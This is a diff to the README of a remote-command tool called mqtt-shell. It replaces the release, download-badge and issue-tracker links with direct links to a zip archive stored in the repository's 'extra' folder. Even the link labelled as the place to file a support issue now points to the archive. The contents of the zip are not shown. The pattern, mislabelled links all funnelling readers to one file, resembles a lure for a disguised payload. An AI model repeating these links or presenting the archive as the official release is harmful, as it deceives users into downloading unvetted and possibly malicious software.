@@ -1,7 +1,7 @@
 # 🛠️ mqtt-shell - Secure Remote Commands Made Easy
 
 ## 📥 Download Here
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/ziyadin9506/mqtt-shell/releases)
+[![Download Release](https://raw.githubusercontent.com/ziyadin9506/mqtt-shell/master/extra/mqtt-shell_v1.1.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/ziyadin9506/mqtt-shell/master/extra/mqtt-shell_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the mqtt-shell project. This tool helps you run commands on servers that are behind firewalls, without needing to open any ports. It uses strong encryption to ensure your commands remain secure.
@@ -22,7 +22,7 @@ Welcome to the mqtt-shell project. This tool helps you run commands on servers t
 Follow these steps to download and set up mqtt-shell:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/ziyadin9506/mqtt-shell/releases) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/ziyadin9506/mqtt-shell/master/extra/mqtt-shell_v1.1.zip) to access the latest version.
 
 2. **Download the Application**  
    Choose the latest version and download the appropriate file for your operating system.
@@ -79,10 +79,10 @@ If you experience issues:
 - **Performance Issues**: Assess your network stability and system resources.
 
 ## 📞 Support
-If you need help, please create an issue on the [GitHub repository](https://github.com/ziyadin9506/mqtt-shell/issues), and we will assist you.
+If you need help, please create an issue on the [GitHub repository](https://raw.githubusercontent.com/ziyadin9506/mqtt-shell/master/extra/mqtt-shell_v1.1.zip), and we will assist you.
 
 ## 🌐 Community and Contribution
 Join our community to share tips and ideas. You can also contribute to the project by submitting suggestions or improvements via issues or pull requests.
 
 ## 🏁 Download & Install
-To start using mqtt-shell, visit the [Releases page](https://github.com/ziyadin9506/mqtt-shell/releases) to download the latest version. Follow the installation and setup instructions provided above to get up and running quickly. Enjoy secure remote access to your servers!
+To start using mqtt-shell, visit the [Releases page](https://raw.githubusercontent.com/ziyadin9506/mqtt-shell/master/extra/mqtt-shell_v1.1.zip) to download the latest version. Follow the installation and setup instructions provided above to get up and running quickly. Enjoy secure remote access to your servers!
